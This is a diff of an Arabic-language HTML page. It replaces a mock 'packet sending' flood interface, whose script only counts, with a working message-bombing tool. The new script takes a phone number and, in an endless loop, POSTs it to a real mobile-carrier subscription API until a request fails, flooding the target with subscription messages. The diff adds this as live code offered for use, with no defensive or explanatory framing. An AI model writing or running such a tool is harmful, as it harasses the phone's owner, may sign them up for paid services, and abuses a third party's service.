@@ -1,105 +1,108 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>واجهة إرسال حزم</title>
+<title>إرسال الرسائل</title>
 <style>
-body {
-font-family: Arial, sans-serif;
-background-color: #f4f4f4;
-color: #333;
+* {
+box-sizing: border-box;
 margin: 0;
-padding: 20px;
+padding: 0;
+font-family: Arial, sans-serif;
 }
-h1 {
-color: #007BFF;
+body {
+display: flex;
+justify-content: center;
+align-items: center;
+min-height: 100vh;
+background: linear-gradient(135deg, #4b6cb7, #182848);
+color: #fff;
 }
-form {
-background: #fff;
-padding: 20px;
+.container {
+background-color: rgba(255, 255, 255, 0.1);
+padding: 30px;
+border-radius: 8px;
+width: 350px;
+text-align: center;
+box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+}
+h2 {
+font-size: 24px;
+margin-bottom: 20px;
+}
+input[type="text"] {
+width: 100%;
+padding: 12px;
+margin-top: 10px;
+margin-bottom: 20px;
+border: none;
 border-radius: 5px;
-box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+background-color: rgba(255, 255, 255, 0.2);
+color: #fff;
+text-align: center;
+font-size: 16px;
+outline: none;
 }
 button {
-background-color: #007BFF;
-color: white;
+width: 100%;
+padding: 12px;
+font-size: 16px;
+font-weight: bold;
+color: #182848;
+background-color: #4b6cb7;
 border: none;
-padding: 10px;
 border-radius: 5px;
 cursor: pointer;
+transition: background-color 0.3s ease;
 }
 button:hover {
-background-color: #0056b3;
+background-color: #395391;
 }
-#result {
+.status {
 margin-top: 20px;
-padding: 10px;
-background: #e7f3fe;
-border: 1px solid #b3d7ff;
-border-radius: 5px;
+font-size: 16px;
 }
 </style>
 </head>
 <body>
-
-<header>
-<h1>واجهة إرسال حزم</h1>
-</header>
-
-<section>
-<form id="packetForm">
-<label for="url">عنوان URL:</label>
-<input type="text" id="url" name="url" required>
-
-<label for="port">رقم المنفذ:</label>
-<input type="number" id="port" name="port" required>
-
-<button type="button" id="sendButton">إرسال حزم</button>
-<button type="button" id="stopButton">إيقاف الإرسال</button>
-</form>
-
-<div id="result">
-<h2>عدد الحزم المرسلة: <span id="packetCount">0</span></h2>
+<div class="container">
+<h2>إرسال رسالة</h2>
+<input type="text" id="phone" placeholder="أدخل رقم الهاتف (مثال: 770...)" />
+<button onclick="sendMessages()">إرسال</button>
+<div id="status" class="status">عدد الرسائل المرسلة: 0</div>
 </div>
-</section>
-
-<footer>
-<p>&copy; 2024 جميع الحقوق محفوظة.</p>
-</footer>
 
 <script>
-let packetCount = 0;
-let sending = false;
-let interval;
+async function sendMessages() {
+let phone = document.getElementById("phone").value;
+let sent = 0;
+document.getElementById("status").innerText = "الرسائل قيد الإرسال...";
 
-document.getElementById('sendButton').addEventListener('click', function() {
-if (sending) return; // منع الضغط المتكرر
+while (true) {
+try {
+let response = await fetch("https://vas2.grand-hub.com/api/ludo/asiacell-d/subscribe", {
+method: "POST",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify({ phone: phone })
+});
+let result = await response.json();
 
-sending = true;
-packetCount = 0; // إعادة تعيين العدد
-document.getElementById('packetCount').innerText = packetCount;
-
-// إرسال 10,000 حزمة في الثانية يعني إرسال حزمة كل 0.1 مللي ثانية
-const packetsPerSecond = 10000;
-const intervalTime = 1000 / packetsPerSecond; // 0.1 مللي ثانية
-
-interval = setInterval(() => {
-for (let i = 0; i < packetsPerSecond; i++) {
-packetCount++;
-document.getElementById('packetCount').innerText = packetCount;
-console.log(`تم إرسال حزمة رقم: ${packetCount}`);
+if (result.message.includes("successfully")) {
+sent++;
+document.getElementById("status").innerText = `تم إرسال الرسالة بنجاح | العدد: ${sent}`;
+} else {
+document.getElementById("status").innerText = `خطأ في إرسال الرسالة | العدد: ${sent}`;
+break;
 }
-}, intervalTime);
-});
-
-document.getElementById('stopButton').addEventListener('click', function() {
-clearInterval(interval);
-sending = false;
-alert('تم إيقاف إرسال الحزم.');
-});
+} catch (error) {
+document.getElementById("status").innerText = `حدث خطأ: ${error.message}`;
+break;
+}
+}
+}
 </script>
-
 </body>
 </html>
